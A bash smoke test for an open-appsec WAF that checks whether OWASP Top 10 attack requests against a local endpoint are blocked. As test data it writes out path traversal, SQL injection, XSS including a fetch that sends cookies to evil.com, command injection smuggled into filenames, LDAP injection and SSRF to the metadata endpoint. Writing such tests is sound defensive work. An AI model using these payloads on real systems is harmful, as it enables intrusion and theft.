#!/usr/bin/env bash
# ─── BIS Platform — WAF Smoke Test (open-appsec + APISIX) ────────────────────
# Tests that the open-appsec WAF correctly blocks OWASP Top 10 attack patterns.
# Usage:
#   bash scripts/waf-smoke-test.sh                    # Test WAF on port 80
#   WAF_URL=http://localhost:80 bash scripts/waf-smoke-test.sh
#
# Exit codes:
#   0 — All WAF tests passed (attacks blocked, legitimate requests allowed)
#   1 — One or more WAF tests failed

set -euo pipefail

WAF_URL="${WAF_URL:-http://localhost:80}"
PASS=0
FAIL=0
SKIP=0
RESULTS=()

# ─── Colour helpers ───────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_pass() { echo -e "  ${GREEN}✔ PASS${NC} $1"; PASS=$((PASS+1)); RESULTS+=("PASS: $1"); }
log_fail() { echo -e "  ${RED}✘ FAIL${NC} $1"; FAIL=$((FAIL+1)); RESULTS+=("FAIL: $1"); }
log_skip() { echo -e "  ${YELLOW}⊘ SKIP${NC} $1"; SKIP=$((SKIP+1)); RESULTS+=("SKIP: $1"); }
log_info() { echo -e "  ${CYAN}ℹ${NC} $1"; }

# ─── Helper: expect HTTP status ───────────────────────────────────────────────
expect_status() {
  local desc="$1"
  local expected_status="$2"
  local url="$3"
  shift 3
  local extra_args=("$@")

  local actual_status
  actual_status=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 10 \
    "${extra_args[@]}" \
    "$url" 2>/dev/null || echo "000")

  if [ "$actual_status" = "$expected_status" ]; then
    log_pass "$desc (HTTP $actual_status)"
  else
    log_fail "$desc (expected HTTP $expected_status, got HTTP $actual_status)"
  fi
}

# ─── Helper: expect status in range ───────────────────────────────────────────
expect_blocked() {
  local desc="$1"
  local url="$2"
  shift 2
  local extra_args=("$@")

  local actual_status
  actual_status=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 10 \
    "${extra_args[@]}" \
    "$url" 2>/dev/null || echo "000")

  # WAF blocks return 400, 403, or 429
  if [[ "$actual_status" =~ ^(400|403|429|503)$ ]]; then
    log_pass "$desc (blocked with HTTP $actual_status)"
  else
    log_fail "$desc (expected block 400/403/429, got HTTP $actual_status)"
  fi
}

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "  BIS Platform — open-appsec WAF Smoke Test"
echo "  WAF URL: $WAF_URL"
echo "  Date:    $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "═══════════════════════════════════════════════════════════════════════"
echo ""

# ─── Pre-flight: Check WAF is running ─────────────────────────────────────────
echo "[ Pre-flight Checks ]"
WAF_HEALTH=$(curl -sf --max-time 5 "$WAF_URL/health" 2>/dev/null || echo "FAILED")
if [[ "$WAF_HEALTH" == *"ok"* ]] || [[ "$WAF_HEALTH" == *"200"* ]]; then
  log_pass "WAF health endpoint reachable"
else
  echo -e "  ${RED}✘ WAF not reachable at $WAF_URL${NC}"
  echo "  Start the WAF with: make waf-up"
  echo "  Or: docker compose --profile waf up -d"
  exit 1
fi
echo ""

# ─── A01: Broken Access Control ───────────────────────────────────────────────
echo "[ A01: Broken Access Control ]"
# Path traversal attempts
expect_blocked "Block path traversal: /../etc/passwd" \
  "$WAF_URL/api/v1/../../../etc/passwd"

expect_blocked "Block path traversal: encoded %2e%2e" \
  "$WAF_URL/api/v1/%2e%2e/%2e%2e/etc/passwd"

expect_blocked "Block null byte injection" \
  "$WAF_URL/api/v1/users%00.json"
echo ""

# ─── A02: Cryptographic Failures ──────────────────────────────────────────────
echo "[ A02: Cryptographic Failures ]"
log_info "Cryptographic failures are server-side controls (not WAF-testable via HTTP)"
log_skip "TLS enforcement (requires HTTPS setup)"
echo ""

# ─── A03: Injection — SQL Injection ───────────────────────────────────────────
echo "[ A03: Injection — SQL Injection ]"
expect_blocked "Block SQL injection in query param: ' OR '1'='1" \
  "$WAF_URL/api/v1/accounts?id=' OR '1'='1"

expect_blocked "Block SQL injection: UNION SELECT" \
  "$WAF_URL/api/v1/accounts?search=1 UNION SELECT username,password FROM users--"

expect_blocked "Block SQL injection: DROP TABLE" \
  "$WAF_URL/api/v1/accounts?id=1; DROP TABLE users--"

expect_blocked "Block SQL injection in POST body" \
  "$WAF_URL/api/trpc/quickcheck.verify" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"json":{"bvn":"1234567890 OR 1=1--"}}'
echo ""

# ─── A03: Injection — XSS ─────────────────────────────────────────────────────
echo "[ A03: Injection — XSS ]"
expect_blocked "Block reflected XSS: <script>alert(1)</script>" \
  "$WAF_URL/api/v1/search?q=<script>alert(1)</script>"

expect_blocked "Block XSS: javascript: protocol" \
  "$WAF_URL/api/v1/search?redirect=javascript:alert(document.cookie)"

expect_blocked "Block XSS: onerror event" \
  "$WAF_URL/api/v1/search?q=<img src=x onerror=alert(1)>"

expect_blocked "Block XSS in POST body" \
  "$WAF_URL/api/trpc/lex.submitIncident" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"json":{"narrative":"<script>fetch(\"https://evil.com/\"+document.cookie)</script>"}}'
echo ""

# ─── A03: Injection — Command Injection ───────────────────────────────────────
echo "[ A03: Injection — Command Injection ]"
expect_blocked "Block command injection: ; ls -la" \
  "$WAF_URL/api/v1/reports?filename=report.pdf;ls+-la"

expect_blocked "Block command injection: \$(id)" \
  "$WAF_URL/api/v1/reports?filename=\$(id)"

expect_blocked "Block command injection: backtick" \
  "$WAF_URL/api/v1/reports?filename=\`cat+/etc/passwd\`"
echo ""

# ─── A03: Injection — LDAP Injection ──────────────────────────────────────────
echo "[ A03: Injection — LDAP Injection ]"
expect_blocked "Block LDAP injection: *)(uid=*))(|(uid=*" \
  "$WAF_URL/api/v1/users?filter=*)(uid=*))(|(uid=*"
echo ""

# ─── A04: Insecure Design — Business Logic ────────────────────────────────────
echo "[ A04: Insecure Design ]"
log_info "Business logic controls are enforced at the application layer (server-side)"
log_skip "Negative amount transfers (application-layer control)"
log_skip "Duplicate submission prevention (application-layer control)"
echo ""

# ─── A05: Security Misconfiguration ───────────────────────────────────────────
echo "[ A05: Security Misconfiguration ]"
# Check security headers are present
HEADERS=$(curl -sI --max-time 10 "$WAF_URL/" 2>/dev/null || echo "")
if echo "$HEADERS" | grep -qi "X-Frame-Options"; then
  log_pass "X-Frame-Options header present"
else
  log_fail "X-Frame-Options header missing"
fi

if echo "$HEADERS" | grep -qi "X-Content-Type-Options"; then
  log_pass "X-Content-Type-Options header present"
else
  log_fail "X-Content-Type-Options header missing"
fi

if echo "$HEADERS" | grep -qi "Referrer-Policy"; then
  log_pass "Referrer-Policy header present"
else
  log_fail "Referrer-Policy header missing"
fi

# Check that APISIX admin API is NOT publicly accessible
ADMIN_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 5 "$WAF_URL/apisix/admin/routes" 2>/dev/null || echo "000")
if [[ "$ADMIN_STATUS" =~ ^(403|404|000)$ ]]; then
  log_pass "APISIX admin API not publicly accessible (HTTP $ADMIN_STATUS)"
else
  log_fail "APISIX admin API may be publicly accessible (HTTP $ADMIN_STATUS)"
fi
echo ""

# ─── A06: Vulnerable Components ───────────────────────────────────────────────
echo "[ A06: Vulnerable Components ]"
log_info "Run 'pnpm audit' to check for vulnerable npm dependencies"
AUDIT_RESULT=$(cd /home/ubuntu/bis-pwa && pnpm audit 2>&1 | tail -3 || echo "audit-failed")
if echo "$AUDIT_RESULT" | grep -qi "0 vulnerabilities\|No known vulnerabilities"; then
  log_pass "pnpm audit: 0 known vulnerabilities"
else
  log_fail "pnpm audit found vulnerabilities: $AUDIT_RESULT"
fi
echo ""

# ─── A07: Authentication Failures ─────────────────────────────────────────────
echo "[ A07: Authentication Failures ]"
# Rate limiting on auth endpoints
AUTH_BLOCKED=false
for i in $(seq 1 25); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 5 \
    -X POST "$WAF_URL/api/oauth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrongpassword"}' 2>/dev/null || echo "000")
  if [[ "$STATUS" =~ ^(429|503)$ ]]; then
    AUTH_BLOCKED=true
    break
  fi
done
if [ "$AUTH_BLOCKED" = true ]; then
  log_pass "Auth endpoint rate limiting active (blocked after repeated attempts)"
else
  log_fail "Auth endpoint rate limiting may not be active (25 requests not blocked)"
fi

# Brute force on LEX submit
LEX_BLOCKED=false
for i in $(seq 1 15); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 5 \
    -X POST "$WAF_URL/api/trpc/lex.submitIncident" \
    -H "Content-Type: application/json" \
    -d '{"json":{"subjectName":"Test","narrative":"Test incident"}}' 2>/dev/null || echo "000")
  if [[ "$STATUS" =~ ^(429|503)$ ]]; then
    LEX_BLOCKED=true
    break
  fi
done
if [ "$LEX_BLOCKED" = true ]; then
  log_pass "LEX submit rate limiting active (blocked after repeated attempts)"
else
  log_skip "LEX submit rate limiting (may need more requests to trigger)"
fi
echo ""

# ─── A08: Software and Data Integrity Failures ────────────────────────────────
echo "[ A08: Software and Data Integrity ]"
log_info "Integrity checks are enforced via HMAC signatures on webhooks"
log_skip "Webhook HMAC validation (requires live webhook endpoint)"
echo ""

# ─── A09: Security Logging Failures ──────────────────────────────────────────
echo "[ A09: Security Logging ]"
# Verify WAF logs are being written
if docker exec bis-open-appsec test -f /var/log/nginx/access.log 2>/dev/null; then
  log_pass "WAF access log file exists"
else
  log_skip "WAF access log check (container may not be running)"
fi
echo ""

# ─── A10: Server-Side Request Forgery ─────────────────────────────────────────
echo "[ A10: Server-Side Request Forgery ]"
expect_blocked "Block SSRF: internal metadata endpoint" \
  "$WAF_URL/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"

expect_blocked "Block SSRF: localhost redirect" \
  "$WAF_URL/api/v1/fetch?url=http://localhost:9180/apisix/admin/routes"

expect_blocked "Block SSRF: file:// protocol" \
  "$WAF_URL/api/v1/fetch?url=file:///etc/passwd"
echo ""

# ─── Legitimate Request Passthrough ───────────────────────────────────────────
echo "[ Legitimate Request Passthrough ]"
# Health check should always pass
expect_status "Health check passes through WAF" "200" \
  "$WAF_URL/health"

# Normal API request (will get 401 since not authenticated, but should NOT be blocked)
NORMAL_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --max-time 10 \
  "$WAF_URL/api/trpc/auth.me" 2>/dev/null || echo "000")
if [[ "$NORMAL_STATUS" =~ ^(200|401|403)$ ]]; then
  log_pass "Normal API request passes through WAF (HTTP $NORMAL_STATUS)"
else
  log_fail "Normal API request unexpectedly blocked (HTTP $NORMAL_STATUS)"
fi
echo ""

# ─── Summary ──────────────────────────────────────────────────────────────────
echo "═══════════════════════════════════════════════════════════════════════"
echo "  WAF Smoke Test Results"
echo "═══════════════════════════════════════════════════════════════════════"
echo -e "  ${GREEN}Passed:${NC}  $PASS"
echo -e "  ${RED}Failed:${NC}  $FAIL"
echo -e "  ${YELLOW}Skipped:${NC} $SKIP"
echo ""

if [ "$FAIL" -gt 0 ]; then
  echo -e "  ${RED}✘ WAF smoke test FAILED ($FAIL failures)${NC}"
  echo ""
  echo "  Failed tests:"
  for r in "${RESULTS[@]}"; do
    if [[ "$r" == FAIL:* ]]; then
      echo -e "    ${RED}• ${r#FAIL: }${NC}"
    fi
  done
  echo ""
  echo "  Ensure open-appsec WAF is running: make waf-up"
  echo "  Check WAF logs: make waf-logs"
  exit 1
else
  echo -e "  ${GREEN}✔ All WAF tests passed${NC}"
  echo ""
  echo "  open-appsec is correctly blocking OWASP Top 10 attack patterns."
  echo "  The BIS platform is protected by ML-based WAF."
fi

echo "═══════════════════════════════════════════════════════════════════════"
